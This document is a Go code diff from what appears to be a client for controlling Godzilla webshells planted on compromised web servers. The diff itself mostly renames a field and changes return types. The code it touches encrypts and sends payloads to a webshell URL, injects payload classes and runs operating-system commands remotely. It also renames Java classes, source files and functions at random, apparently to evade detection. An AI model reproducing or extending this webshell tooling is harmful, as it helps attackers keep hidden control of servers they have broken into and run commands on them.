@@ -23,24 +23,24 @@ type GodzillaInfo struct {
 	// 哥斯拉的一些加密模式
 	Crypto godzilla.CrypticType
 	// 字符编码
-	Encoding                string
-	encoding                godzilla.EncodingCharset
-	ReqLeft                 string
-	ReqRight                string
-	dynamicClassNameHashMap map[string]string
+	Encoding        string
+	encoding        godzilla.EncodingCharset
+	ReqLeft         string
+	ReqRight        string
+	dynamicFuncName map[string]string
 }
 
 func (g *GodzillaInfo) setDefaultParams() map[string]string {
-	g.dynamicClassNameHashMap = make(map[string]string, 2)
-	g.dynamicClassNameHashMap["test"] = "test"
-	g.dynamicClassNameHashMap["getBasicsInfo"] = "getBasicsInfo"
-	g.dynamicClassNameHashMap["execCommand"] = "execCommand"
-	return g.dynamicClassNameHashMap
+	g.dynamicFuncName = make(map[string]string, 2)
+	g.dynamicFuncName["test"] = "test"
+	g.dynamicFuncName["getBasicsInfo"] = "getBasicsInfo"
+	g.dynamicFuncName["execCommand"] = "execCommand"
+	return g.dynamicFuncName
 }
 
 func NewGodzillaInfo(g *GodzillaInfo) (*GodzillaInfo, error) {
 	g.secretKey = utils.SecretKey(g.Key)
-	g.dynamicClassNameHashMap = g.setDefaultParams()
+	g.dynamicFuncName = g.setDefaultParams()
 
 	if len(g.Encoding) == 0 {
 		g.Encoding = "utf-8"
@@ -89,7 +89,7 @@ func (g *GodzillaInfo) EvalFunc(className, funcName string, parameter *godzilla.
 	parameter.AddString(r1, r2)
 	if className != "" && len(strings.Trim(className, " ")) > 0 {
 		if g.Script == shell.JavaScript {
-			parameter.AddString("evalClassName", g.dynamicClassNameHashMap[className])
+			parameter.AddString("evalClassName", g.dynamicFuncName[className])
 		} else if g.Script == shell.PhpScript || g.Script == shell.AspScript {
 			parameter.AddString("codeName", className)
 		} else if g.Script == shell.CsharpScript {
@@ -106,20 +106,20 @@ func (g *GodzillaInfo) sendPayload(payload []byte) []byte {
 	var enData []byte
 	if g.Script == shell.AspScript {
 		enData = godzilla.Encrypto(payload, g.secretKey, g.Password, g.Crypto, g.Script)
-		result, ok := g.Client.DoRequest(g.Url, string(enData), 0, 0)
+		result, ok := g.Client.DoRequestAndMatch(g.Url, string(enData), 0, 0)
 		if !ok {
 			panic("EvalFunc1 error")
 		}
-		deData := godzilla.Decrypto(result.Data, g.secretKey, g.Password, g.Crypto, g.Script)
+		deData := godzilla.Decrypto(result.RawBody, g.secretKey, g.Password, g.Crypto, g.Script)
 		return deData
 	} else {
 		gzipData, _ := gzip.GzipCompress(payload)
 		enData = godzilla.Encrypto(gzipData, g.secretKey, g.Password, g.Crypto, g.Script)
-		result, ok := g.Client.DoRequest(g.Url, string(enData), 0, 0)
+		result, ok := g.Client.DoRequestAndMatch(g.Url, string(enData), 0, 0)
 		if !ok {
 			panic("EvalFunc1 error")
 		}
-		deData := godzilla.Decrypto(result.Data, g.secretKey, g.Password, g.Crypto, g.Script)
+		deData := godzilla.Decrypto(result.RawBody, g.secretKey, g.Password, g.Crypto, g.Script)
 		res, err := gzip.GzipDeCompress(deData)
 		if err != nil {
 			panic("EvalFunc error :" + err.Error())
@@ -138,16 +138,16 @@ func (g *GodzillaInfo) dynamicUpdateClassName(oldName string, classContent []byt
 
 	// 替换 SourceFile Hex值为 : 000C7061796C6F61642E6A617661 / 00 0C payload.java
 	classContent = dynamic.ReplaceSourceFile(classContent, fileName, fakeFileName)
-	g.dynamicClassNameHashMap[fileName] = fakeFileName
+	g.dynamicFuncName[fileName] = fakeFileName
 
 	// 替换 execCommand() 函数为 whoami() 函数
 	classContent = dynamic.ReplaceFuncName(classContent, "execCommand", "execCommand2")
-	g.dynamicClassNameHashMap["execCommand"] = "execCommand2"
+	g.dynamicFuncName["execCommand"] = "execCommand2"
 
 	// 随机替换类名
 	newClassName := dynamic.RandomClassName()
-	g.dynamicClassNameHashMap[oldName] = newClassName
-	fmt.Println("随机包名Class :", g.dynamicClassNameHashMap)
+	g.dynamicFuncName[oldName] = newClassName
+	fmt.Println("随机包名Class :", g.dynamicFuncName)
 	return dynamic.ReplaceClassName(classContent, oldName, newClassName)
 }
 
@@ -162,7 +162,7 @@ func getParameter() *godzilla.Parameter {
 func (g *GodzillaInfo) InjectPayload() {
 	payload := g.GetPayload()
 	data := godzilla.Encrypto(payload, g.secretKey, g.Password, g.Crypto, g.Script)
-	_, ok := g.Client.DoRequest(g.Url, string(data), 0, 0)
+	_, ok := g.Client.DoRequestAndMatch(g.Url, string(data), 0, 0)
 	if !ok {
 		panic("EvalFunc error")
 	}
@@ -217,7 +217,7 @@ func (g *GodzillaInfo) execCommand(commandStr string) string {
 			parameter.AddString("executableArgs", executableArgs[1])
 		}
 	}
-	result := g.EvalFunc("", g.dynamicClassNameHashMap["execCommand"], parameter)
+	result := g.EvalFunc("", g.dynamicFuncName["execCommand"], parameter)
 	decode, err := g.encoding.CharsetDecode(result)
 	if err != nil {
 		return ""
@@ -417,7 +417,7 @@ func (g *GodzillaInfo) Include(codeName string, binCode []byte) bool {
 	parameter := getParameter()
 	if g.Script == shell.JavaScript {
 		binCode = g.dynamicUpdateClassName(codeName, binCode)
-		codeName = g.dynamicClassNameHashMap[codeName]
+		codeName = g.dynamicFuncName[codeName]
 		if codeName != "" {
 			parameter.AddString("codeName", codeName)
 			parameter.AddBytes("binCode", binCode)
@@ -481,14 +481,15 @@ func (g *GodzillaInfo) screen() string {
 	return ""
 }
 
-func (g *GodzillaInfo) Ping(p shell.IParams) bool {
+func (g *GodzillaInfo) Ping(p ...shell.IParams) bool {
 	return g.test()
 }
 
-func (g *GodzillaInfo) BasicInfo() string {
-	return g.getBasicsInfo()
+func (g *GodzillaInfo) BasicInfo(p ...shell.IParams) shell.IResult {
+
+	return httpx.NewResult([]byte(g.getBasicsInfo()))
 }
 
-func (g *GodzillaInfo) CommandExec(c string) string {
-	return g.execCommand(c)
+func (g *GodzillaInfo) CommandExec(c string) shell.IResult {
+	return httpx.NewResult([]byte(g.execCommand(c)))
 }
